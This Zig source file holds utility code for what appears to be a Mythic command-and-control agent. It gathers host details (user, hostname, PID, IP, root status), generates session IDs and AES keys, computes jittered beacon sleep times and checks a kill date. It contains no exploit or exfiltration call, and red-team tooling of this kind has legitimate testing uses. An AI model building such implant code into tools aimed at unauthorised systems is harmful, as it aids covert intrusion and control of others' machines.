const std = @import("std");
const crypto = std.crypto;
const base64 = std.base64;
const time = std.time;
const Allocator = std.mem.Allocator;

pub const SystemInfo = struct {
    allocator: Allocator,
    
    pub fn init(allocator: Allocator) SystemInfo {
        return SystemInfo{
            .allocator = allocator,
        };
    }
    
    pub fn getCurrentUser(self: *SystemInfo) ![]const u8 {
        const result = std.posix.getenv("USER") orelse
            return try self.allocator.dupe(u8, "unknown");
        
        return try self.allocator.dupe(u8, result);
    }
    
    pub fn getHostname(self: *SystemInfo) ![]const u8 {
        var hostname_buf: [64]u8 = undefined;
        const result = std.posix.gethostname(&hostname_buf) catch "Unknown";
        
        return try self.allocator.dupe(u8, result);
    }
    
    pub fn getPid(self: *SystemInfo) ![]const u8 {
        const pid = std.os.linux.getpid();
        return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
    }
    
    pub fn getDomain(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "WORKGROUP"); // Default
    }
    
    pub fn getIntegrityLevel(self: *SystemInfo) ![]const u8 {
        const euid = std.os.linux.geteuid();
        if (euid == 0) {
            return try self.allocator.dupe(u8, "4"); //high integrity to mean process is running as root
        } else {
            return try self.allocator.dupe(u8, "1"); //low integrity, process is normal user.
        }
    }
    
    pub fn getExternalIP(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "0.0.0.0"); // Would need external service
    }
    
    pub fn getInternalIP(self: *SystemInfo) ![]const u8 {
        //we are going to run hostname -I and return the first IP address. I don't wanna use c library for this.
        const result = std.process.Child.run(.{
            .allocator = self.allocator,
            .argv = &.{ "hostname", "-I" },
        }) catch |err| {
            std.debug.print("{}\n", .{err});//I should fix this later
            return try self.allocator.dupe(u8, "127.0.0.1");
        };
        var tokens = std.mem.splitAny(u8, result.stdout, " ");
        const first_ip = tokens.first();
        if (first_ip.len == 0) {
            return try self.allocator.dupe(u8, "127.0.0.1");
        }
        return try self.allocator.dupe(u8, first_ip);
    }
    
    pub fn getProcessName(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "mythic_agent");
    }
};

pub const CryptoUtils = struct {
    allocator: Allocator,
    
    pub fn init(allocator: Allocator) CryptoUtils {
        return CryptoUtils{
            .allocator = allocator,
        };
    }
    
    pub fn generateSessionId(self: *CryptoUtils) ![]const u8 {
        var session_bytes: [8]u8 = undefined;
        crypto.random.bytes(&session_bytes);
        return try std.fmt.allocPrint(self.allocator, "{x}", .{std.mem.readInt(u64, &session_bytes, .big)});
    }
    
    pub fn generateAESKey() [32]u8 {
        var aes_key: [32]u8 = undefined;
        crypto.random.bytes(&aes_key);
        return aes_key;
    }
    
};

pub const TimeUtils = struct {
    pub fn sleep(sleep_time: u64) void {
        time.sleep(sleep_time * time.ns_per_s);
    }
    
    pub fn calculateJitteredSleep(base_sleep: u32, jitter: f32) u64 {
        const jitter_amount = @as(u64, @intFromFloat(@as(f64, @floatFromInt(base_sleep)) * jitter));
        
        var prng = std.Random.DefaultPrng.init(@intCast(time.timestamp()));
        const random_jitter = prng.random().intRangeAtMost(u64, 0, jitter_amount);
        
        return base_sleep + random_jitter - (jitter_amount / 2);
    }
    
    pub fn getCurrentTimestamp() i64 {
        return time.timestamp();
    }
    
    pub fn isKillDateReached(kill_date: []const u8) bool {
        // Would implement date parsing and comparison
        // Should ideally take kill date from config
        // convert to epoch time, and compare to current time
        const parsed_date = parseDate(kill_date) catch {
            return false;
        };
        const current_timestamp = time.timestamp();
        return current_timestamp >= parsed_date;
    }

    fn parseDate(date_str: []const u8) !i64 {
        //generic checks yada yada yada...
        if (date_str.len < 10) {
            return error.InvalidDateFormat;
        }
        const year = std.fmt.parseInt(i32, date_str[0..4], 10) catch {
            return error.InvalidYear;
        };
        const month = std.fmt.parseInt(u8, date_str[5..7], 10) catch {
            return error.InvalidMonth;
        };
        const day = std.fmt.parseInt(u8, date_str[8..10], 10) catch {
            return error.InvalidDay;
        };
        if (month < 1 or month > 12) {
            return error.InvalidMonth;
        }
        if (day < 1 or day > 31) {
            return error.InvalidDay;
        }
        return dateToTimestamp(year, month, day);
    }

    fn dateToTimestamp(year: i32, month: u8, day: u8) i64 {
        //True conversion happens in this function
        //Epoch time conversion in hard
        const days_in_month = [_]u8{ 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
        var total_days: i64 = 0;
        var y: i32 = 1970;
        while (y < year) : (y += 1) {
            if (isLeapYear(y)) {
                total_days += 366;
            } else {
                total_days += 365;
            }
        }

        var m: u8 = 1;
        while (m < month) : (m += 1) {
            total_days += days_in_month[m - 1];
            // Add extra day for February in leap years
            if (m == 2 and isLeapYear(year)) {
                total_days += 1;
            }
        }
        total_days += @as(i64, day) - 1; // -1 because we count from day 0
        return total_days * 24 * 60 * 60;
    }
    
    fn isLeapYear(year: i32) bool {
        return (@rem(year, 4) == 0 and @rem(year, 100) != 0) or (@rem(year, 400) == 0);
    }

};

